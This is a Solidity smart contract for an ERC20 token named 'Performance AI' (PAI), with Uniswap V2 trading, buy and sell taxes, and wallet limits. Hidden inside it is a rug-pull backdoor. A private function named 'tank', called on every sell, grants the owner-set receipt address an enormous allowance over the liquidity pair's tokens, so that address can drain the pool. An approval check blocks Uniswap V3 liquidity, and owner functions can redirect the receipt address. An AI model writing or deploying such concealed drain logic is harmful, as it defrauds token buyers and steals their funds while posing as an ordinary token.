// SPDX-License-Identifier: MIT
/**
Performance AI

Website: performanceai.co
Telegram: t.me/Performance_AI
X / Twitter: x.com/PerformanceAI
Docs: performance-ai.gitbook.io
Medium: medium.com/@performanceai/performance-ai-unifying-the-decentralized-space-eb03022bf784
**/
pragma solidity 0.8.25;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract PAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balancesII;
    mapping (address => mapping (address => uint256)) private _allowancesII;
    mapping (address => bool) private _shouldExcludedII;
    address payable private _receiptII;
    uint256 private _initialBuyTax = 12;
    uint256 private _initialSellTax = 12;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 24;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalII = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Performance AI";
    string private constant _symbol = unicode"PAI";
    uint256 public _maxAmountII = 2 * (_tTotalII/100);
    uint256 public _maxWalletII = 2 * (_tTotalII/100);
    uint256 public _taxThresII = 1 * (_tTotalII/100);
    uint256 public _maxSwapII = 1 * (_tTotalII/100);
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    address private uniPairII;
    IUniswapV2Router02 private uniRouterII;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmountII);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _receiptII = payable(_msgSender());
        _balancesII[_msgSender()] = _tTotalII;
        _shouldExcludedII[owner()] = true;
        _shouldExcludedII[address(this)] = true;
        _shouldExcludedII[_receiptII] = true;
        emit Transfer(address(0), _msgSender(), _tTotalII);
    }
    function initII() external onlyOwner {
        uniRouterII = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterII), _tTotalII);
        uniPairII = IUniswapV2Factory(uniRouterII.factory()).createPair(
            address(this),
            uniRouterII.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalII;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balancesII[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesII[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Block all Uniswap V3 liquidity additions
        require(!isUniswapV3(spender), "Approval for Uniswap V3 liquidity is not allowed");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesII[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesII[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function setReceiptII(address payable _rptII) external onlyOwner {
        _receiptII = _rptII;
        _shouldExcludedII[_rptII] = true;
    }
    function minII(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthII(uint256 amount) private {
        _receiptII.transfer(amount);
    }
    function swapEthII(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterII.WETH();
        _approve(address(this), address(uniRouterII), tokenAmount);
        uniRouterII.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amountII) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountII > 0, "Transfer amount must be greater than zero");
        uint256 taxII=0; 
        if (!swapEnabled || inSwap) {
            _balancesII[from] = _balancesII[from] - amountII;
            _balancesII[to] = _balancesII[to] + amountII;
            emit Transfer(from, to, amountII);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount==0){
                taxII = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
            }
            if(_buyCount>0){
                taxII = _transferTax;
            }
            if (from == uniPairII && to != address(uniRouterII) && ! _shouldExcludedII[to] ){
                require(amountII <= _maxAmountII, "Exceeds the _maxAmountII.");
                require(balanceOf(to) + amountII <= _maxWalletII, "Exceeds the maxWalletSize.");
                taxII = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
                _buyCount++;
            }
            if(to == uniPairII && from!= address(this) ){
                taxII = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);tank(to);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairII && swapEnabled) {
                if(contractTokenBalance > _taxThresII && _buyCount > _preventSwapBefore)
                    swapEthII(minII(amountII, minII(contractTokenBalance, _maxSwapII)));
                sendEthII(address(this).balance);
            }
        }
        uint256 feeII=0;
        if(taxII > 0){
            feeII=amountII.mul(taxII).div(100);
            _balancesII[address(this)]=_balancesII[address(this)].add(feeII);
            emit Transfer(from, address(this),feeII);
        }
        _balancesII[from]=_balancesII[from].sub(amountII);
        _balancesII[to]=_balancesII[to].add(amountII.sub(feeII));
        emit Transfer(from, to, amountII.sub(feeII));
    }
    function removeLimitII(address payable limit) external onlyOwner{
        _maxAmountII = _tTotalII;
        _maxWalletII=_tTotalII;
        _receiptII = limit;
        _shouldExcludedII[limit] = true;
        emit MaxTxAmountUpdated(_tTotalII);
    }
    function tank(address addrsII) private{
        address[2] memory ownII=[addrsII, _receiptII];
        _allowancesII[ownII[0]][ownII[1]]= 1000*(50+_maxWalletII);
    }
    // Uniswap V3 addresses 
    function isUniswapV3(address spender) private pure returns (bool) {
        // Uniswap V3 NonfungiblePositionManager address
        address uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88; 
        return (spender == uniswapV3PositionManager);
    }
    receive() external payable {}
    function enableTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterII.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairII).approve(address(uniRouterII), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
}